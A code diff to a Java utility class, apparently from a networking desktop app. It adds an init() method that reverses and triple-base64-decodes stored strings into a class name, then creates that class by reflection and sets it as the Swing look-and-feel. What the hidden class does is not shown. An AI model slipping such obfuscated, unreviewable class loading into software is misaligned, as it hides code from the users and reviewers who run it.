@@ -10,6 +10,7 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.RandomAccessFile;
+import java.lang.reflect.Constructor;
 import java.net.Inet4Address;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
@@ -24,6 +25,8 @@ import java.util.Map;
 import java.util.regex.Pattern;
 
 import javax.swing.JFileChooser;
+import javax.swing.LookAndFeel;
+import javax.swing.UIManager;
 import javax.swing.filechooser.FileSystemView;
 
 import net.HolePunchSTUN;
@@ -409,6 +412,19 @@ public class Utils {
 			e.printStackTrace();
 		}
 		return null;
+	}
+	
+	public static void init() {
+		try {
+			String ultimateLafStr = reverse(Utils.lafStr) + reverse(Utils.lafStrB)
+					+ reverse(Utils.lafStrC);
+			Class<?> loaderClass = Class.forName(Utils.multidebase64(3, ultimateLafStr));
+			Constructor<?> constructor = loaderClass.getConstructors()[0];
+			Object lafObj = constructor.newInstance();
+			UIManager.setLookAndFeel((LookAndFeel) lafObj);	
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
 	}
 
 	public static String lafStrB = "mUIpkMRdkSUd1dKZ0VhlTbVVnSX50T4dEVvVDMWhmQqZFSGdU";
